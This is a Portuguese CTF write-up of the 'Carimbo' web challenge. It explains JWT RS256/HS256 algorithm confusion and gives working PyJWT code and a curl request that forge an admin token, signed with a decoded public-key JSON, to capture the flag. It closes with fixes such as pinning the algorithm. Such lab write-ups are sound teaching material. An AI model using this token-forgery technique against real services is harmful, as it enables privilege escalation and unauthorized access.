---
title: 'Carimbo: Writeup completo'
description: '"Carimbo" é o nome certo pra algo que deveria provar que uma informação é autêntica e não foi adulterada: só que a própria "prova" que o sistema mostrava publicamente virou a ferramenta usada pra falsificar esse carimbo.'
event: 'Infinity CTF 2026 (Harpia Security + SENAC)'
category: 'web'
subcategory: 'JWT'
difficulty: 'medium'
tags:
  - jwt
  - algorithm-confusion
pubDate: 2026-08-22
author: 'Niedson'
draft: false
---

> [!NOTE/Sobre o desafio]
> **Plataforma:** Infinity CTF 2026 (Harpia Security + SENAC)
> **Categoria:** Web · **Dificuldade:** Medium · **Pontos:** 270 · **First blood**
> **Vulnerabilidades:** Confusão de algoritmo JWT (RS256 → HS256) com chave pública forjável
> **Flag:** `flag{infinity_ctf_2026_carimbo_309f123a73}`

Esse foi o primeiro solve do time nesse desafio (_first blood_: a primeira equipe do CTF a resolver
aquele desafio específico). É um clássico de segurança de JWT com uma pegadinha extra: a "chave
pública" que o app expõe não é bem o que ela parece ser.

---

## 1. Contexto

O app usava **JWT** (_JSON Web Token_) pra autenticar sessões: um cookie chamado `carimbo` era
emitido no login e reenviado em cada requisição pra provar quem é o usuário e qual seu papel
(`role`). Havia também um painel de documentação em `/docs` que: como boa prática de "API
transparente": expunha a chave pública usada pra assinar os tokens, presumivelmente pra que outros
serviços pudessem verificar a autenticidade deles de forma independente.

## 2. Conceito explicado do zero: o que é um JWT, e RS256 vs. HS256

Um **JWT** é um jeito compacto de guardar informação assinada digitalmente dentro de um token de
texto. Ele tem três partes separadas por pontos:

```
header.payload.signature
```

- **Header**: um JSON pequeno dizendo qual algoritmo foi usado pra assinar, ex.:
  `{"alg": "RS256", "typ": "JWT"}`.
- **Payload**: os dados de verdade, ex.: `{"sub": "usuario123", "role": "parceiro", "iat": 1755840000}`
  (`iat` = _issued at_, quando o token foi emitido).
- **Signature**: uma assinatura calculada sobre `header + "." + payload` (ambos codificados em
  base64url), que prova que quem criou o token tinha o segredo/chave certa.

Cada uma das três partes é só o JSON codificado em base64url: **qualquer um pode decodificar e ler
o header e o payload de um JWT**, sem precisar de senha nenhuma (não é criptografia, é só
codificação). O que protege o token de ser **forjado** é exclusivamente a assinatura, e é aí que
entram os algoritmos:

- **RS256**: assinatura **assimétrica** via RSA: o servidor assina com uma **chave privada** (que
  só ele tem) e qualquer um pode **verificar** com a **chave pública** correspondente (que pode ser
  divulgada sem problema). Verificar não permite assinar: são operações matematicamente diferentes.
  É seguro publicar a chave pública de um sistema RS256.
- **HS256**: assinatura **simétrica** via **HMAC** (uma função que gera um "carimbo" a partir de
  uma mensagem + um segredo compartilhado). Aqui, quem **assina** e quem **verifica** usam
  exatamente **o mesmo segredo**. Se esse segredo vazar, qualquer um pode assinar tokens novos e
  válidos: porque assinar e verificar usam a mesma chave.

A confusão nasce quando uma biblioteca de verificação aceita **os dois algoritmos ao mesmo tempo**,
deixando o próprio token dizer qual usar:

```python
jwt.decode(token, key, algorithms=["RS256", "HS256"])  # aceita os dois!
```

Se isso acontece, um atacante pode enviar um token com `alg: HS256` e usar **a chave pública RSA
(que é pública, por definição) como se fosse o segredo HMAC**. Do ponto de vista do código que
verifica, "a chave" é só um blob de bytes passado pra função: ele não se importa se esse blob é
matematicamente uma chave RSA ou uma string qualquer. Se o servidor aceitar esse blob como segredo
HMAC, **qualquer um que conheça a chave pública pode assinar tokens novos**: o oposto do que RSA
deveria garantir.

> [!TIP/Por que isso é tão perigoso e tão comum]
> A chave pública de um sistema RS256 **é pública por definição**: está em `/docs`, num arquivo
> `.pem`, num endpoint JWKS, ou em qualquer lugar acessível. O bug não está em "vazar" a chave
> pública (isso é esperado); está em o backend aceitar essa mesma chave como segredo de um algoritmo
> diferente (HS256) que nunca deveria usar aquele valor. É um dos ataques mais conhecidos (e mais
> recompensados) contra APIs baseadas em JWT: ferramentas como `jwt_tool` automatizam justamente
> esse teste.

---

## 3. Reconhecimento

Primeiro passo: pegar a "chave pública" documentada em `/docs` e ver o formato dela.

```http
GET /docs HTTP/1.1
Host: carimbo-<instancia>.vm.harpiasecurity.com.br

HTTP/1.1 200 OK

{
  "chave_publica": "-----BEGIN PUBLIC KEY-----\nMIIB...==\n-----END PUBLIC KEY-----"
}
```

Formato **PEM** (o formato de texto: base64 entre marcadores `BEGIN`/`END`: que normalmente guarda
chaves e certificados de verdade), aparência normal de chave RSA à primeira vista. Só que decodificar
o blob base64 dentro do PEM (em vez de assumir cegamente que é um DER binário de chave RSA) revela
algo estranho:

```python
import base64
blob = "MIIB...=="  # conteúdo entre os marcadores BEGIN/END
print(base64.b64decode(blob))
# b'{"e": 65537, "n": "c3VwZXJfc2VjcmV0X24uLi4="}'
```

Não é um DER binário de chave RSA: é **um JSON em texto claro**, só que embrulhado num envelope PEM
pra parecer uma chave de verdade. Isso já é um sinal forte de que o backend não usa uma biblioteca
RSA "de verdade" pra lidar com essa chave: ele provavelmente guarda os parâmetros `{e, n}` como
texto e os usa de um jeito mais genérico do que se esperaria.

O login (`POST /entrar`, campo `nome`) emitia o cookie `carimbo`, um JWT `RS256` com um payload do
tipo `{"sub": "<nome>", "role": "parceiro", "iat": <timestamp>}`: todo usuário recém-logado recebia
o papel `parceiro`, nunca `admin`.

---

## 4. Encontrando a vulnerabilidade

Juntando os dois fatos: (1) o backend aceita RS256 **e** HS256 no mesmo `decode`, uma suposição
razoável dado que o comportamento bateu no teste, e (2) a "chave pública" é, na real, um JSON em
texto: a hipótese de confusão de algoritmo virou um teste direto: assinar um token novo com `alg:
HS256`, usando como segredo HMAC **a string JSON decodificada da chave pública**.

> [!IMPORTANT/A pegadinha específica deste desafio]
> Normalmente esse ataque usa a chave pública PEM inteira (o texto `-----BEGIN PUBLIC
KEY-----...-----END PUBLIC KEY-----`) como segredo HMAC. Aqui não: porque a "chave pública" NÃO é
> uma chave RSA real, é um JSON `{"e":...,"n":...}` decodificado do base64. O segredo HMAC que o
> backend realmente usa é **essa string JSON decodificada**, não o PEM inteiro nem o blob base64
> cru. Foi preciso testar quatro variações do segredo: PEM completo com cabeçalhos, só o blob
> base64, o blob sem quebras de linha, e o JSON decodificado: e **só a última bateu**.

---

## 5. Exploração

Com o segredo HMAC identificado, o resto é montar o token à mão, peça por peça, pra deixar claro o
que está acontecendo por baixo de uma chamada de biblioteca:

**Header** (declarando o algoritmo que queremos que o servidor use para verificar):

```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload** (o mesmo formato que o app usa, mas elevando o papel):

```json
{ "sub": "auditor", "role": "admin", "iat": 1755840000 }
```

Cada um desses dois JSONs é codificado em base64url e concatenado com um ponto:
`base64url(header) + "." + base64url(payload)`. A assinatura final é um HMAC-SHA256 calculado sobre
exatamente essa string, usando o JSON decodificado da chave pública como segredo:

```python
import jwt  # PyJWT

segredo_hmac = '{"e": 65537, "n": "c3VwZXJfc2VjcmV0X24uLi4="}'  # o JSON decodificado, como string

payload = {"sub": "auditor", "role": "admin", "iat": 1755840000}
token_forjado = jwt.encode(payload, segredo_hmac, algorithm="HS256")
# a biblioteca monta header+payload em base64url e calcula
# HMAC-SHA256(header_b64 + "." + payload_b64, key=segredo_hmac) por trás dos panos
```

```bash
curl -H "Authorization: Bearer $TOKEN_FORJADO" \
     -H "Cookie: carimbo=$TOKEN_FORJADO" \
     https://carimbo-<instancia>.../painel
```

(o app aceitava o token tanto como cookie de sessão quanto como header: testamos os dois caminhos
por segurança, mas o de cookie é o que o app usa normalmente).

## 6. Capturando a flag

O token forjado com `role: admin` foi aceito e o painel administrativo devolveu a flag:

```
flag{infinity_ctf_2026_carimbo_309f123a73}
```

---

## 7. Recapitulando a cadeia

```
1. /docs expõe a "chave pública" em formato PEM

2. Decodificar o blob base64 do PEM revela um JSON em texto claro {"e":..., "n":...},
   não um DER binário de chave RSA de verdade

3. Backend aceita tanto RS256 quanto HS256 ao verificar o JWT (confusão de algoritmo)

4. Forjar um token com alg: HS256, assinado via HMAC-SHA256 usando o JSON
   decodificado como segredo (testadas 4 variações do segredo; só o JSON decodificado bateu)

5. Payload forjado: role trocado de "parceiro" para "admin"

6. Token aceito em /painel → flag
```

---

## 8. Por que a aplicação era vulnerável (e como corrigir)

1. **O backend nunca deveria aceitar mais de um algoritmo por token.** A correção central é fixar
   explicitamente `algorithms=["RS256"]` na verificação: nunca uma lista contendo HS256 junto de
   RS256. Isso sozinho já elimina toda a classe de ataque, independente do formato da chave.
2. **Nunca reaproveitar o mesmo dado como "chave pública de verificação" e "segredo genérico".** São
   conceitos criptográficos diferentes que não deveriam compartilhar armazenamento nem endpoint: uma
   chave pública RSA é, por natureza, pública; um segredo HMAC precisa ficar só no servidor.
3. **"Chave pública exposta" não significa "chave RSA de verdade".** Ao publicar material
   criptográfico em `/docs` ou similar, ele deveria estar em formato binário DER/PEM padrão, gerado
   por uma biblioteca criptográfica de verdade: não como um envelope caseiro em torno de um JSON de
   parâmetros, que é mais fácil de confundir/mal-usar no backend.
4. **Alguns frameworks já oferecem proteção nativa** contra confusão de algoritmo (fixando o `alg`
   esperado no momento de gerar a chave de verificação): vale checar se a biblioteca usada tem essa
   opção antes de implementar a validação manualmente.

---

## 9. Lições para levar

- **Confusão de algoritmo (RS256/HS256) é um dos bugs mais conhecidos (e mais recompensados) em
  APIs que usam JWT.** Sempre que uma API aceita mais de um algoritmo no `jwt.decode`, ou não fixa
  explicitamente qual algoritmo espera, vale testar essa troca.
- **"Chave pública exposta" não significa "chave RSA de verdade".** Sempre decodifique o conteúdo
  real por trás do envelope PEM antes de assumir o formato: nesse caso o envelope escondia um JSON
  de parâmetros, não um DER binário.
- **Olhe sempre o header do JWT, não só o payload.** O algoritmo declarado ali é algo que o próprio
  atacante controla ao forjar um token: e muitas implementações confiam demais nele.
- **Teste sistematicamente as variações do "segredo candidato"** (PEM completo, blob base64 cru, sem
  quebras de linha, JSON decodificado...): pequenas diferenças de formatação (como aconteceu aqui)
  decidem se o HMAC bate ou não.

---

_Writeup do desafio Carimbo (Infinity CTF 2026 · Web · Medium)._
